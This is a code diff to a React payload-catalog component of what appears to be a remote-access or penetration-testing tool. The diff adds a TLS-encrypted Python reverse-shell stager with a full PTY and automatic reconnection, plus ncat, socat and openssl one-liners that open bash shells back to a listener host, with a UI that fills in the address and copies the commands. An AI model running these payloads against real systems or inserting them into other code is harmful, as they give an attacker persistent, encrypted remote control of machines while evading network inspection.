@@ -66,6 +66,48 @@ while 1:
  except:pass
  time.sleep(5)'`;
 
+// TLS-encrypted variant of the robust stager (matches sessions/stagers.py python_tls_stager).
+const TLS_STAGER = `python3 -c 'import socket,os,pty,select,time,signal,ssl
+T="{TOKEN}";H="{LHOST}";P={PORT}
+while 1:
+ s=None;pid=0
+ try:
+  raw=socket.socket();raw.connect((H,P))
+  s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)
+  s.send(b"RECCE1 "+T.encode()+b"\\n")
+  pid,fd=pty.fork()
+  if pid==0:os.execv("/bin/sh",["/bin/sh","-c","exec bash -i 2>/dev/null||exec sh -i"])
+  while 1:
+   r=select.select([s,fd],[],[],1)[0]
+   if s in r or s.pending():
+    d=s.recv(4096)
+    if not d:break
+    os.write(fd,d)
+   if fd in r:
+    d=os.read(fd,1024)
+    if not d:break
+    s.send(d)
+ except Exception:pass
+ try:
+  if pid>0:os.kill(pid,signal.SIGKILL)
+ except:pass
+ try:
+  if s:s.close()
+ except:pass
+ time.sleep(5)'`;
+
+// raw one-liners for a TLS listener (plaintext ones won't complete the TLS handshake)
+const TLS_CATALOG: { group: string; items: P[] }[] = [
+  {
+    group: "Linux / Unix (TLS)",
+    items: [
+      { label: "ncat --ssl", tmpl: "ncat --ssl {LHOST} {PORT} -e /bin/bash", note: "if ncat present" },
+      { label: "socat (TLS)", tmpl: "socat OPENSSL:{LHOST}:{PORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY, encrypted" },
+      { label: "openssl", tmpl: "mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s" },
+    ],
+  },
+];
+
 const genToken = () => {
   const a = new Uint8Array(8);
   crypto.getRandomValues(a);
@@ -81,29 +123,32 @@ function CopyLine({ text }: { text: string }) {
   );
 }
 
-export function PayloadCatalog({ port }: { port: number }) {
+export function PayloadCatalog({ port, tls = false }: { port: number; tls?: boolean }) {
   const [lhost, setLhost] = useState(location.hostname);
   const [token] = useState(genToken);
   const fill = (t: string) =>
     t.split("{LHOST}").join(lhost).split("{PORT}").join(String(port)).split("{TOKEN}").join(token);
+  const stager = tls ? TLS_STAGER : STAGER;
+  const catalog = tls ? TLS_CATALOG : CATALOG;
   return (
     <div className="payload-catalog">
       <label className="payload-lhost">
         LHOST <input className="scan-in" value={lhost} onChange={(e) => setLhost(e.target.value)}
                      title="the address the target should call back to" />
+        {tls && <span className="muted small">🔒 encrypted listener — use these TLS payloads</span>}
       </label>
 
       <div className="payload-group">
-        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY (recommended)</div>
+        <div className="payload-group-h robust">★ Robust · auto-reconnect PTY{tls ? " · TLS" : ""} (recommended)</div>
         <div className="payload-item robust-item">
           <span className="payload-label">python</span>
-          <code className="payload-code">{fill(STAGER)}</code>
-          <span className="payload-note muted small">full PTY, self-healing — survives drops &amp; rebinds</span>
-          <CopyLine text={fill(STAGER)} />
+          <code className="payload-code">{fill(stager)}</code>
+          <span className="payload-note muted small">full PTY, self-healing{tls ? ", encrypted" : ""} — survives drops &amp; rebinds</span>
+          <CopyLine text={fill(stager)} />
         </div>
       </div>
 
-      {CATALOG.map((g) => (
+      {catalog.map((g) => (
         <div key={g.group} className="payload-group">
           <div className="payload-group-h">{g.group}</div>
           {g.items.map((p) => (
